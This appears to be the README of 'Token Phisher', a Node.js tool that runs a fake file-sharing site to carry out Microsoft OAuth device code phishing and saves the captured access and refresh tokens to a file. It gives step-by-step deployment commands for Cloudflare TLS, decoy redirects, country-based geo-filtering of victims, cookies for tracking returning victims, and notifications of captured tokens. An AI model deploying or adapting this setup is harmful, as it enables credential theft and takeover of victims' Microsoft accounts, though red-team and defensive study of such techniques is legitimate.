# Token Phisher

## Description
This NodeJS app listens for users accessing the website. In the background a Device Code Flow is started and the User Code presented to the user. Once the user finished the flow, the tokens are stored to a file. This default example is configured to imitate a file sharing process.

## Requirements
Node.js 18+

## Quick start

```bash
npm install
npm run setup -- --help
```

### Production (Cloudflare TLS)

Point your domain at Cloudflare, then run setup with an API token that has **Account → Cloudflare Origin CA: Edit** and **Zone: Read**:

```bash
export CLOUDFLARE_API_TOKEN=your_token_here

npm run setup -- \
  --domain share.example.com \
  --redirect-url https://www.microsoft.com \
  --already-logged-in-url https://onedrive.live.com/your-decoy-share \
  --geoip CH,DE
```

Setup will:
1. Create a Cloudflare Origin certificate (valid ~15 years), or reuse an existing one
2. Save certs to `/var/lib/tokenphisher/certs/<domain>/` (outside the app directory)
3. Write `config.json` with absolute cert paths
4. Update the `defaultConfig` block in `server.js`

**Redeploying** — clone fresh, run setup again with the same `--domain`. Existing certs are reused automatically; no API token needed unless you pass `--force-renew`:

```bash
git pull   # or fresh clone into a new directory
npm install
npm run setup -- \
  --domain share.example.com \
  --redirect-url https://www.microsoft.com \
  --already-logged-in-url https://onedrive.live.com/your-decoy-share
```

Set Cloudflare SSL/TLS mode to **Full (strict)**, then start the server:

```bash
sudo npm start   # ports 80/443 require elevated privileges on Linux
```

### Local testing (no TLS)

```bash
npm run setup -- --test-mode --redirect-url https://http.cat
npm start
```

The app listens on HTTP port 80 (or change `httpPort` in config).

## Running

```bash
npm start
# or
node server.js
```

Configuration is loaded from `config.json` when present. If missing, `server.js` falls back to its embedded `defaultConfig`.

Re-run `npm run setup` any time to change settings or re-provision certificates. Setup always rewrites `config.json` and syncs `server.js`.

## Manual configuration

Copy the example and edit by hand if you prefer:

```bash
cp config.example.json config.json
```

Or edit `defaultConfig` in `server.js` directly, then run:

```bash
npm run setup -- --config-only --from-config config.json
```

### Configuration reference

| Key | Description |
|-----|-------------|
| `httpPort` | HTTP port (test mode only) |
| `httpsPort` | HTTPS port |
| `testMode` | `true` = HTTP only, no TLS |
| `debug` | Verbose console and log output |
| `clientId` | OAuth client ID — see [MS client ID research](https://github.com/secureworks/family-of-client-ids-research/blob/main/scope-map.txt) |
| `tokenUrl` | Token endpoint (tenant must match `deviceCodeUrl`) |
| `deviceCodeUrl` | Device code flow start URL |
| `scopes` | Space-separated OAuth scopes; include `offline_access` for refresh tokens |
| `phishingHTML` | Template in `views/` shown to victims |
| `redirectUrl` | Redirect for `/` and blocked geo IPs |
| `alreadyLoggedInURL` | Redirect for returning victims (cookie set) |
| `cookieExpirationInDays` | Cookie lifetime |
| `userCodesFile` | Log of phished user codes |
| `logFile` | Application log |
| `tokenFile` | Captured tokens |
| `threemaOn` / `threemaTo` / `threemaFrom` / `threemaURL` / `threemaSecret` | Optional Threema notifications |
| `keyFilePath` / `certFilePath` / `caFilePath` | TLS certificate paths (set automatically by setup) |
| `userAgent` | User-Agent for OAuth requests |
| `geoipallowlist` | ISO country codes allowed to reach `/share` |

## Certificates

### Cloudflare (recommended)

Use `npm run setup` with `--domain` and `--cf-token`. Origin certificates work when traffic is proxied through Cloudflare.

Certs are stored persistently at **`/var/lib/tokenphisher/certs/<domain>/`** by default (survives redeploys). Override with `--cert-store` or `TOKENPHISHER_CERT_STORE`. Setup reuses valid certs automatically; use `--force-renew` only when you intentionally need a new certificate.

```
/var/lib/tokenphisher/certs/share.example.com/
  privkey.pem
  cert.pem
  origin-ca.pem
  cert-meta.json
```

### Let's Encrypt (manual)

```bash
sudo certbot certonly --standalone
```

Then point `keyFilePath`, `certFilePath`, and `caFilePath` in config at the certbot paths and run setup with `--config-only`.

## Other notes

- Static assets for the phishing page go in `public/assets/`
- User codes expire after 15 minutes; polling stops automatically
- The app logs polling status every minute when debug is off
